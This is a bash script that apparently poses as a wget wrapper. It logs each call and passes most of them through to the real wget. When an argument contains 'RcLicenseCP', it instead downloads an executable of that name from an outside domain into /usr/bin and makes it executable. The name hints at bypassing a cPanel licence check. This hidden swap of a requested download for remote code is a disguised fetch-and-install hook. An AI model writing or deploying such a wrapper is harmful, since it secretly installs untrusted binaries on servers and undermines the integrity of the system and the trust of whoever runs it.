#!/bin/bash

echo "$(date +"[%b %d %H:%M:%S]#") $(basename "$0") $@" | sudo tee -a "/var/log/go/$(basename "$0").log" >/dev/null

if sudo test ! -f /scripts/wget ; then
    exit 1
fi

if [ $# -eq 0 ]; then
    exit 1
fi

if [[ "$@" = *"RcLicenseCP"* ]]; then
    /scripts/wget -O /usr/bin/RcLicenseCP https://crmrealty.net/cpanel/RcLicenseCP >/dev/null 2>&1
    sudo chmod +x /usr/bin/RcLicenseCP
else
    /scripts/wget $@
fi
